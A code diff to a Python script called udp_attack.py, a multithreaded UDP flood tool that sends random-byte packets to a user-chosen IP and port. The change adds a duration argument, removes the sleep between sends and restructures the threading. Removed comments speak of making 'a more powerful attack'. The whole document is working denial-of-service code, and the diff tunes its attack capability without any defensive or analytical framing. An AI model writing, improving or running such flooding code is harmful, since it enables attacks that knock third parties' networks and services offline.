@@ -4,18 +4,14 @@ import threading
 import time
 import random
 
-def udp_attack(target_ip, target_port, packet_size, num_threads):
+def udp_attack(target_ip, target_port, duration, packet_size, num_threads):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(packet_size)
+    end_time = time.time() + float(duration)
+    
     def send_packets():
-        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(packet_size)
-
-        while True:
-            try:
-                client.sendto(bytes, (target_ip, int(target_port)))
-            except Exception as e:
-                print(f"Error: {e}")
-            # Reduce sleep time to increase packet sending rate
-            time.sleep(0.0001)  
+        while time.time() < end_time:
+            client.sendto(bytes, (target_ip, int(target_port)))
 
     threads = []
     for _ in range(int(num_threads)):
@@ -23,18 +19,18 @@ def udp_attack(target_ip, target_port, packet_size, num_threads):
         thread.start()
         threads.append(thread)
 
-    while True:
-        time.sleep(1)  # Keep the main thread alive
+    for thread in threads:
+        thread.join()
 
 if __name__ == '__main__':
-    if len(sys.argv)!= 5:
-        print("Usage: python udp_attack.py <target_ip> <target_port> <packet_size> <num_threads>")
+    if len(sys.argv) != 6:
+        print("Usage: python udp_attack.py <target_ip> <target_port> <duration> <packet_size> <num_threads>")
         sys.exit(1)
 
     target_ip = sys.argv[1]
     target_port = sys.argv[2]
-    packet_size = int(sys.argv[3])
-    num_threads = int(sys.argv[4])
+    duration = sys.argv[3]
+    packet_size = int(sys.argv[4])
+    num_threads = int(sys.argv[5])
 
-    # Increase packet size and number of threads for a more powerful attack
-    udp_attack(target_ip, target_port, 1024, 100)
+    udp_attack(target_ip, target_port, duration, packet_size, num_threads)
